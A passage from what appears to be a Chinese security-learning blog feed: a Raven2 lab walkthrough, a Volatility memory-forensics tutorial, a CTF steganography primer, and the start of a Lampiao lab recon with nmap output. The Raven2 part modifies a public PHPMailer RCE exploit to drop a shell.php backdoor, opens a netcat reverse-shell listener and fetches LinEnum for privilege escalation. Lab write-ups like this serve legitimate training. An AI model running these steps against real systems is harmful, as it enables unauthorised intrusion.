alt=""></p><p>在vender里面可以看到<br><img src="https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f719.png" alt=""></p><p>逐个去看发现存在PHPMailer<br><img src="https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f633.png" alt=""></p><p>并且在version</p><p>里面提示了版本号5.2.16</p><p>看到还有一个wordpress，访问了一下/wordpress</p><p>勉强能看？</p><p>既然是wordpress，我们就可以用wpscan扫描看看</p><p>没啥东西</p><p>不如试试PHPMailer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ searchsploit PHPMailer</span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                              |  Path</span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line">PHPMailer 1.7 - &#x27;Data()&#x27; Remote Denial of Service           | php/dos/25752.txt</span><br><span class="line">PHPMailer &lt; 5.2.18 - Remote Code Execution                  | php/webapps/40968.sh</span><br><span class="line">PHPMailer &lt; 5.2.18 - Remote Code Execution                  | php/webapps/40970.php</span><br><span class="line">PHPMailer &lt; 5.2.18 - Remote Code Execution                  | php/webapps/40974.py</span><br><span class="line">PHPMailer &lt; 5.2.19 - Sendmail Argument Injection (Metasploi | multiple/webapps/41688.rb</span><br><span class="line">PHPMailer &lt; 5.2.20 - Remote Code Execution                  | php/webapps/40969.py</span><br><span class="line">PHPMailer &lt; 5.2.20 / SwiftMailer &lt; 5.4.5-DEV / Zend Framewo | php/webapps/40986.py</span><br><span class="line">PHPMailer &lt; 5.2.20 with Exim MTA - Remote Code Execution    | php/webapps/42221.py</span><br><span class="line">PHPMailer &lt; 5.2.21 - Local File Disclosure                  | php/webapps/43056.py</span><br><span class="line">WordPress Plugin PHPMailer 4.6 - Host Header Command Inject | php/remote/42024.rb</span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>确实有，而且不少</p><p>下载 php/webapps/40974.py的python文件，并进行修改</p><p><img src="https://pic.imgdb.cn/item/667d8214d9c307b7e91bb5ce.png" alt=""></p><p>其中的意思是在访问/content.php的时候建立一个shell.php的后门文件</p><p>打开地址网站，访问/contact.php，然后监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>进去以后先升级交互shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;;</span><br></pre></td></tr></table></figure><p>使用LinEnum(Linux枚举及权限提升检查工具)<br>直接下载：<br><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a><br>搭建http服务进行EXP文件传输：<br>python3 -m http.server 8000<br>进行下载：<br>wget <a href="http://192.168.3.2:8000/LinEnum-master/LinEnum.sh">http://192.168.3.2:8000/LinEnum-master/LinEnum.sh</a><br>加执行权限：<br>chmod +x LinEnum.sh<br>执行：<br>(可以查看到Mysql是用root登陆的)<br><img src="https://pic.imgdb.cn/item/667d83a2d9c307b7e91ef6de.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure><p>能看到flag2和3</p><p>然后使用mysql的udf提权<br>后面的看一下大佬的吧，我没弄成，等我明天看看原理再说/ww</p><p><a href="https://www.freebuf.com/articles/web/261047.html">https://www.freebuf.com/articles/web/261047.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> raven2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存取证</title>
      <link href="/2025/01/08/2024%E5%B9%B46%E6%9C%8825%E6%97%A5-%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
      <url>/2025/01/08/2024%E5%B9%B46%E6%9C%8825%E6%97%A5-%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="内存取证与流量分析"><a href="#内存取证与流量分析" class="headerlink" title="内存取证与流量分析"></a>内存取证与流量分析</h1><p>内存取证</p><p>内存取证分为活取证和死取证</p><p>活取证就是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在主机存活时发现系统被入侵,然后直接把机器的运行内存dump下来，对运行内存进行还原分析</span><br></pre></td></tr></table></figure><br>主要工作就是<br>看系统<br>看命令<br>哈希摘要<br>日志文件<br>内存信息</p><p>死取证就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对机器的磁盘做镜像之后进行分析，在关机后制作硬盘镜像，分析镜像（MBR硬盘分区,GPT全局分区表,LVM逻辑卷）是否存在病毒,木马等恶意程序</span><br></pre></td></tr></table></figure><p>内存取证主要用的就是vol</p><p>现在有vol2和vol3</p><p>但是个人认为vol3没有2好用</p><p>但是vol2的配置就是依托</p><h1 id="vol2安装"><a href="#vol2安装" class="headerlink" title="vol2安装"></a>vol2安装</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">首先需要安装依赖</span><br><span class="line">sudo apt install -y python2  libpython2-dev</span><br><span class="line">sudo python2 -m pip install -U setuptools wheel</span><br><span class="line"></span><br><span class="line">下载 pip2</span><br><span class="line"></span><br><span class="line">sudo wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line"></span><br><span class="line">python 依赖</span><br><span class="line"></span><br><span class="line">sudo pip2 install pycrypto distorm3</span><br><span class="line"></span><br><span class="line">下载 volatility 到 /usr/share 目录</span><br><span class="line"></span><br><span class="line">cd /usr/share</span><br><span class="line">sudo git clone https://github.com/volatilityfoundation/volatility</span><br><span class="line">cd volatility</span><br><span class="line">sudo python2 setup.py install</span><br><span class="line"></span><br><span class="line">vol.py -h</span><br></pre></td></tr></table></figure><p>如果你报错了但是pytho2 vol.py可行，说明你跳步骤了</p><p>vol的指令格式是固定的，3和2的差不多，就是插件的调用方法和profile不用指定就是了</p><p><a href="https://blog.csdn.net/m0_68012373/article/details/127419463">命令集可以看这个大佬的</a></p><p>vol一般都是直接用插件冲，所以我们需要知道插件是干啥的<br><img src="https://pic.imgdb.cn/item/667ab997d9c307b7e9c9aac5.png" alt=""></p><h2 id="imageinfo"><a href="#imageinfo" class="headerlink" title="imageinfo"></a>imageinfo</h2><p>分析内存镜像的基本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 镜像文件 imageinfo</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/667ab9c7d9c307b7e9ca07fb.png" alt=""></p><h2 id="pslist"><a href="#pslist" class="headerlink" title="pslist"></a>pslist</h2><p>plist：查看镜像中正在运行的进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 镜像文件 --profile=镜像文件  pslist</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/667aba5cd9c307b7e9cb3566.png" alt=""></p><h2 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h2><p>以树的形式来列出正在进行的进程</p><p><img src="https://pic.imgdb.cn/item/667abac8d9c307b7e9cc2626.png" alt=""></p><h2 id="cmdscan"><a href="#cmdscan" class="headerlink" title="cmdscan"></a>cmdscan</h2><p>cmdscan是搜索XP / 2003 / Vista / 2008和conhost.exe上搜索csrss.exe的内存，<br>对于win7是搜索cmd.exe。是搜索命令行的输入历史记录</p><p><img src="https://pic.imgdb.cn/item/667abb5cd9c307b7e9cd45f7.png" alt=""></p><p>这是xp的</p><p><img src="https://pic.imgdb.cn/item/667abb76d9c307b7e9cd81d1.png" alt=""></p><p>这是window 7 的</p><h2 id="consoles"><a href="#consoles" class="headerlink" title="consoles"></a>consoles</h2><p>跟cmdscan类似，但是他不是扫描command_history，但是扫描consoles_information<br>cmdscan只能看输入的命令但是console能看到缓冲区的输出</p><p><img src="https://pic.imgdb.cn/item/667abc2ad9c307b7e9cef3a8.png" alt=""></p><h2 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h2><p>列举出所有命令行下运行的程序<br>privs:显示进程权限<br>envars：显示进程环境变量<br>verinfo：显示PE文件中嵌入的版本信息<br>enumfunc：列出进程，dll和内核驱动程序导入和导出</p><h2 id="filescan"><a href="#filescan" class="headerlink" title="filescan"></a>filescan</h2><p>扫描文件指令，一般后面直接就是 | grep ‘flag’</p><p>或者| grep -E “png”（查找png后缀文件）</p><h2 id="dumpfiles"><a href="#dumpfiles" class="headerlink" title="dumpfiles"></a>dumpfiles</h2><p>dump出指定PID的文件，一般只要是做内存题都会用到的指令。</p><p>procdump<br>转储进程的可执行文件，后跟PID</p><p>memdump<br>可以将内存中的某个进程保存出来</p><p>volatility -f win7.vmem —profile=Win7SP1x64 memdump -p [PID] -D ./</p><h2 id="用Hash获取密码"><a href="#用Hash获取密码" class="headerlink" title="用Hash获取密码"></a>用Hash获取密码</h2><p>mimikatz</p><h2 id="printkey"><a href="#printkey" class="headerlink" title="printkey"></a>printkey</h2><p>获取用户：volatility -f raw.raw —profile=Win7SP1x64 printkey -K “SAM\Domains\Account\Users\Names</p><p>例题：弗列格殿下</p><p>日常的imageinfo看系统</p><p>看filescan</p><p>看cmdline</p><p>看consoles</p><p>看iehistory</p><p>哦终于又发现</p><p>看到他下载了flag.jpg和hint.txt</p><p><img src="https://pic.imgdb.cn/item/667aca23d9c307b7e9ec7e05.png" alt=""></p><p>filescan | grep hint</p><p>dumpfiles -Q 地址 -D ./</p><p>gilescan | grep flag</p><p>这个没有，hint提示了fl4g，搜</p><p><img src="https://pic.imgdb.cn/item/667aca23d9c307b7e9ec7e40.png" alt=""></p><p>gilescan | grep fl4g</p><p>dumpfiles -Q 地址 -D ./</p><p>两个一样的图片，梦回隐写</p><p><img src="https://pic.imgdb.cn/item/667aca2ad9c307b7e9ec8c72.png" alt=""></p><p>双写隐写，png在前</p><p>聚合图床不让放二维码，这里你们自己解一下</p><p>出了个二维码，扫码打开，百度翻译，听语音</p><p><img src="https://pic.imgdb.cn/item/667aca5fd9c307b7e9ecf42a.png" alt=""></p><p>flag{abcdefg}</p>]]></content>
      
      
      <categories>
          
          <category> 内存取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 内存取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF--隐写术</title>
      <link href="/2025/01/08/2024%E5%B9%B46%E6%9C%8825%E6%97%A5-CTF%E9%9A%90%E5%86%99%E6%9C%AF/"/>
      <url>/2025/01/08/2024%E5%B9%B46%E6%9C%8825%E6%97%A5-CTF%E9%9A%90%E5%86%99%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-MISC简单介绍"><a href="#CTF-MISC简单介绍" class="headerlink" title="CTF  MISC简单介绍"></a>CTF  MISC简单介绍</h1><p>MISC，就是杂项，简单来说就是利用工具解密，算是CTF中最有意思的一个分支了</p><p>MISC中比较多出现的题目呢</p><p>图片的，文件的相关隐写</p><p>伪加密</p><p>亦或是将文件隐藏再docx,pdf中的各个位置，</p><p>这些都是存在的（索引你平时看的文件中可能存在另一个文件（雾））</p><h1 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h1><p>图片隐写呢可以根据图种分为几大类</p><p>JPG图片隐写，PNG图片隐写，GIF图片隐写以及其他类的图片隐写</p><p>但是都差不多</p><h2 id="改文件"><a href="#改文件" class="headerlink" title="改文件"></a>改文件</h2><p>首先保证人手一个010editor或者winhex</p><p><img src="https://pic.imgdb.cn/item/667a9782d9c307b7e98c21e4.png" alt=""><br>打开文件发现文件头是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FF D8 FF E1</span><br></pre></td></tr></table></figure><br>说明是一个JPG文件（jpeg也是JPG</p><p>图片隐写的三板斧呢，</p><p>第一，看文件头</p><p>判断是什么类型的图片，然后可以用010的模板中的模板脚本辅助查找</p><p>第二，看文件尾部</p><p>正常文件结尾是固定的，但是有时候尾部会缀点东西，因为图片已经结束了所以<br>不影响正常文件的显示</p><p>第三，文件中部</p><p>会有一些人把明文信息直接丢到文件中的，一般会有提示符（不然谁费事巴拉的去找</p><p>还有一种就是图片更改宽高</p><p><img src="https://pic.imgdb.cn/item/667a971fd9c307b7e98b88c3.png" alt=""></p><p>16进制表中，</p><p>【固定】前面8个字节是文件头部信息，只需要看前面查表<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FF D8 FF E1 14 2E 45 78</span><br></pre></td></tr></table></figure><br>【固定】再有4个字节是数据段长度<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">69 66 00 00</span><br></pre></td></tr></table></figure></p><p>【固定】前面4个字节是文件头数据块的表示<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4D 4D 00 2A</span><br></pre></td></tr></table></figure><br>（可变）13个字节</p><p>前面4个表示宽<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 08</span><br></pre></td></tr></table></figure><br>中间四个表示高<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 0C 01 00</span><br></pre></td></tr></table></figure><br>后面五个依次是Bit depth、ColorType、Compression method、Filter method、Interlace method<br>(了解都不需要)</p><h3 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h3><p>虽然不是图片隐写但还是说一下把反正都要用010</p><p>文件是加密的但是解压不行，说明可能是伪加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">压缩源文件数据区：</span><br><span class="line">50 4B 03 04：这是头文件标记（0x04034b50）</span><br><span class="line">14 00：解压文件所需 pkware 版本</span><br><span class="line">00 00：全局方式位标记（有无加密）</span><br><span class="line">08 00：压缩方式</span><br><span class="line">5A 7E：最后修改文件时间</span><br><span class="line">F7 46：最后修改文件日期</span><br><span class="line">16 B5 80 14：CRC-32校验（1480B516）</span><br><span class="line">19 00 00 00：压缩后尺寸（25）</span><br><span class="line">17 00 00 00：未压缩尺寸（23）</span><br><span class="line">07 00：文件名长度</span><br><span class="line">00 00：扩展记录长度</span><br><span class="line"> </span><br><span class="line">压缩源文件目录区：</span><br><span class="line">50 4B 01 02：目录中文件文件头标记(0x02014b50)</span><br><span class="line">3F 00：压缩使用的 pkware 版本</span><br><span class="line">14 00：解压文件所需 pkware 版本</span><br><span class="line">00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</span><br><span class="line">08 00：压缩方式</span><br><span class="line">5A 7E：最后修改文件时间</span><br><span class="line">F7 46：最后修改文件日期</span><br><span class="line">16 B5 80 14：CRC-32校验（1480B516）</span><br><span class="line">19 00 00 00：压缩后尺寸（25）</span><br><span class="line">17 00 00 00：未压缩尺寸（23）</span><br><span class="line">07 00：文件名长度</span><br><span class="line">24 00：扩展字段长度</span><br><span class="line">00 00：文件注释长度</span><br><span class="line">00 00：磁盘开始号</span><br><span class="line">00 00：内部文件属性</span><br><span class="line">20 00 00 00：外部文件属性</span><br><span class="line">00 00 00 00：局部头部偏移量</span><br><span class="line"> </span><br><span class="line">压缩源文件目录结束标志：</span><br><span class="line">50 4B 05 06：目录结束标记</span><br><span class="line">00 00：当前磁盘编号</span><br><span class="line">00 00：目录区开始磁盘编号</span><br><span class="line">01 00：本磁盘上纪录总数</span><br><span class="line">01 00：目录区中纪录总数</span><br><span class="line">59 00 00 00：目录区尺寸大小</span><br><span class="line">3E 00 00 00：目录区对第一张磁盘的偏移量</span><br><span class="line">00 00：ZIP 文件注释长度</span><br></pre></td></tr></table></figure><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>LSB最低有效位隐写</p><p>LSB原理就是利用古人言识别不出来的差异信息来进行加密</p><p><img src="https://pic.imgdb.cn/item/667a976ad9c307b7e98bfb72.png" alt=""><br>举个例子</p><p>BUU-LSB</p><p>QR search能用就用，用不了就用网站</p><p><a href="https://www.lddgo.net/image/qrcodescanner">在线二维码扫描器</a></p><h2 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h2><p>通常是将图片进行离散余弦、小波或者傅里叶变换，得到图片的频谱信息，<br>再将水印的编码信息叠加到图片的频谱上，<br>然后再进行一次逆变换，<br>生成的图片就带有几乎无法检测、但又可以确切还原出来的盲水印了<br><img src="https://pic.imgdb.cn/item/667a97d2d9c307b7e98ca410.png" alt=""><br><img src="https://pic.imgdb.cn/item/667a97d2d9c307b7e98ca43d.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bwm.py decode file1 file2 outfile</span><br></pre></td></tr></table></figure><p>盲水印有个傅里叶盲水印的</p><p>例题</p><p>攻防世界 misc 4-1</p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>二维码是从右向左填充的数据，纠错码会在数据段之后</p><p><img src="https://pic.imgdb.cn/item/667a97aad9c307b7e98c689a.png" alt=""></p><h2 id="binwalk和foremost"><a href="#binwalk和foremost" class="headerlink" title="binwalk和foremost"></a>binwalk和foremost</h2><p>binwalk查看图片信息</p><p>可以快速知道是不是由多个文件合并而成并将其分离</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">分析</span><br><span class="line">binwalk filename</span><br><span class="line">分离</span><br><span class="line">binwalk -e filename</span><br></pre></td></tr></table></figure><p>或者你直接用foremost分离文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foremost filename -o output</span><br><span class="line">foremost 文件名 -o 输出目录名</span><br></pre></td></tr></table></figure><h2 id="IDAT块隐写"><a href="#IDAT块隐写" class="headerlink" title="IDAT块隐写"></a>IDAT块隐写</h2><p>图像数据块 IDAT（image data chunk）：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。IDAT 块只有当上一个块充满时，才会继续一个新的块。</p><p>（找了一圈没找到一个IDAT的，找了个图你们看看明白就好<br><img src="https://pic.imgdb.cn/item/667a974dd9c307b7e98bcea6.png" alt=""></p><p>图片隐写还有很多，像素点的，二维码的,gif的，这个其实就纯看脑洞</p><h1 id="docx和ppt隐写"><a href="#docx和ppt隐写" class="headerlink" title="docx和ppt隐写"></a>docx和ppt隐写</h1><p>docx说白了也是一种zip形式，我们可以改成zip然后再进行寻找就能找到</p><p>字体的隐藏</p><p>书签</p><p>解压以后图片的设置</p><h1 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h1><p>音频隐写主要使用的是Audacity</p><p>看波形，看频率，经常在这里放摩斯密码或者是声音中参杂着</p><p>这个题呢就是典型的波形，放大到最大看前面你的就找到了</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lampao靶场</title>
      <link href="/2025/01/08/2024%E5%B9%B46%E6%9C%8824%E6%97%A5-lampiao/"/>
      <url>/2025/01/08/2024%E5%B9%B46%E6%9C%8824%E6%97%A5-lampiao/</url>
      
        <content type="html"><![CDATA[<p>Lampao</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><figcaption><span>经典操作</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.159.129  netmask 255.255.255.0  broadcast 192.168.159.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe4d:c7ff  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:4d:c7:ff  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 1032607  bytes 1116865188 (1.0 GiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 399718  bytes 94273606 (89.9 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 8  bytes 480 (480.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 8  bytes 480 (480.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sS 192.168.159.0/24                                            </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 22:34 CST</span><br><span class="line">Nmap scan report for 192.168.159.1</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">Not shown: 997 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.159.2</span><br><span class="line">Host is up (0.000084s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/tcp open  domain</span><br><span class="line">MAC Address: 00:50:56:E1:64:0A (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.159.131</span><br><span class="line">Host is up (0.00050s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:AB:2F:A2 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.159.254</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.159.254 are in ignored states.</span><br><span class="line">Not shown: 1000 filtered tcp ports (no-response)</span><br><span class="line">MAC Address: 00:50:56:FC:B0:1B (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.159.129</span><br><span class="line">Host is up (0.0000030s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 11.89 seconds</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -p- 192.168.159.131   </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 22:39 CST</span><br><span class="line">Nmap scan report for 192.168.159.131</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">1898/tcp open  cymtec-port</span><br><span class="line">MAC Address: 00:0C:29:AB:2F:A2 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看到开放了22端口，80端口和1898端口<br>推测存在ssh，http，以及一个而后台登录的<br><img src="https://pic.imgdb.cn/item/6679856ad9c307b7e9ab749e.png" alt=""></p><p>80端口访问一下发现没什么可以利用的</p><p>转手就是1898</p><p>一个看着很有年代感的东西<br><img src="https://pic.imgdb.cn/item/66798de1d9c307b7e9c6b588.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LuizGonzaga-LampiaoFalou.mp3</span><br></pre></td></tr></table></figure><p>看到一个mp3的文件，先记下来不知道有没有用</p><p>readmore打开发现是一个发展史</p><p>看着没什么了，扫描一下后台吧那就<br><img src="https://pic.imgdb.cn/item/66798e00d9c307b7e9c74b36.png" alt=""><br><img src="https://pic.imgdb.cn/item/66798df3d9c307b7e9c70175.png" alt=""></p><p>robots.txt开放，打开发现一堆东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.131:1898/?q=node/1</span><br></pre></td></tr></table></figure><p>刚才看到我就想搞一搞这个，感觉可能存在sql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 